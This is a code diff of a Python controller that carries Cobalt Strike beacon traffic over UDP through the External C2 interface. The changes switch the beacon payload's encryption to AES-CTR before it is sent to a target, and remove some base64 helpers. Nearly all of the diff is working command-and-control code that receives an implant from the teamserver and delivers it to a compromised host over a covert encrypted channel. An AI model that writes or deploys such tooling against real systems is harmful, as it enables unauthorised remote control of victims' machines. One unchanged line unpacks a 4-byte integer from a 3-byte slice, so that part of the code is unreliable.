@@ -4,14 +4,15 @@
     Program to provide basic UDP communications for Cobalt Strike using the External C2 feature.
 """
 import argparse
-import base64
 import ipaddress
 import socket
 import struct
 import sys
 import time
-import select
-import wolfcrypt
+from base64 import b64encode
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from Crypto.Random import get_random_bytes
 
 
 class SocketInfo:
@@ -28,6 +29,7 @@ class SocketInfo:
         :param pipe_str: String for named pipe on client
         :param timeout: The socket timeout option (in seconds)
         :param retries: The number of times to retry a recv
+        :param key: The AES key to encrypt comms
         """
         if len(pipe_str) > 50:
             raise ValueError('pipe_str must be less than 50 characters')
@@ -66,43 +68,6 @@ class ExternalC2Controller:
         len = struct.unpack("<I", data[0:3])
         body = data[4:]
         return len[0], body
-    
-    def base64(self, msg):
-        """
-
-        :param msg: String to encode in Base64
-        :return: Base64 encoded string (in bytes)
-        """
-        b64msg = base64.b64encode(msg)
-        return b64msg
-
-    def debase64(self, b64msg):
-        """
-
-        :param b64msg: Base64 string to be decoded
-        :return: Decoded string
-        """
-        msg = base64.b64decode(b64msg)
-        return msg
-
-    ##UNUSED FUNCTION, CONSIDER REMOVING
-    # def equalcheck(self, b64msg):
-    #     """
-
-    #     :param b64msg: Base64 string
-    #     :return: Base64 string with == at end of it
-    #     """
-    #     # TODO: Find a better way of checking for end of B64 message
-    #     equalbytes = "=".encode()
-    #     equalequalbytes = "==".encode()
-    #     if b64msg.find(equalequalbytes) != -1:
-    #         return b64msg
-    #     elif b64msg.find(equalbytes) != -1:
-    #         b64msg += equalbytes
-    #         return b64msg
-    #     else:
-    #         b64msg += equalequalbytes
-    #         return b64msg
 
     def send_to_ts(self, data):
         """
@@ -296,11 +261,6 @@ class ExternalC2Controller:
         # Receive the beacon payload from CS to forward to our target
         payload = self.recv_from_ts()
 
-        iv = ''.join([chr(random.randint(0, 0xFF)) for i in range(16)])
-        print("IV : {}".format(iv))
-        cipher = Aes(bytes(socketInfo.key), MODE_CBC, iv)
-        encrypted_payload = iv + cipher.encrypt(payload)
-
         # Now that we have our beacon to send, wait for a connection from our target
         self._socketServer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self._socketServer.bind((socketInfo.srv_ip,socketInfo.srv_port))
@@ -353,10 +313,18 @@ class ExternalC2Controller:
             if (not connected):
                 print("Failed 3-way handshake from {}".format(clientAddr))
 
-        print("Handshake completed. Sending payload size {} to client.".format(len(encrypted_payload)))  
+        print("Handshake completed. Sending payload size {} to client.".format(len(payload)))  
 
-        # Send beacon payload to target
-        self.sendToBeacon(encrypted_payload)
+        # Send iv and encrypted beacon payload to target
+        cipher = AES.new((socketInfo.key).encode(), AES.MODE_CTR)
+        ct_bytes = cipher.encrypt(payload)
+        #nonce = b64encode(cipher.nonce).decode('utf-8')
+        #ct = b64encode(ct_bytes).decode('utf-8')
+        nonce = cipher.nonce
+        ct = ct_bytes
+        print("Nonce: {} \nCT: {}".format(nonce, ct))
+        self.sendToBeacon(nonce)
+        self.sendToBeacon(ct)
 
         #Wait for payload
         time.sleep(1)
@@ -388,7 +356,7 @@ parser.add_argument('srv_port', type=int, help="Port number to bind to on server
 parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
 parser.add_argument('timeout', type=int, help="The socket timeout option (in seconds) set by settimeout()")
 parser.add_argument('retries', type=int, help="Number of times to retry listening for a connection after a timeout occurs.")
-parser.add_argument('key', help="AES key to encrypt the beacon that is initially sent.")
+parser.add_argument('key', help="AES key to encrypt the beacon that is initially sent. It must be the same as the client.")
 parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
 parser.add_argument('--restart', '-r', default="N", help="Sleep 10s then restart the server after a disconnect or exit (Y/N). Default is N.")
 parser.add_argument('--arch', '-a', choices=['x86', 'x64'], default='x86', type=str, help="Architecture to use for beacon. x86 or x64. Default is x86.")
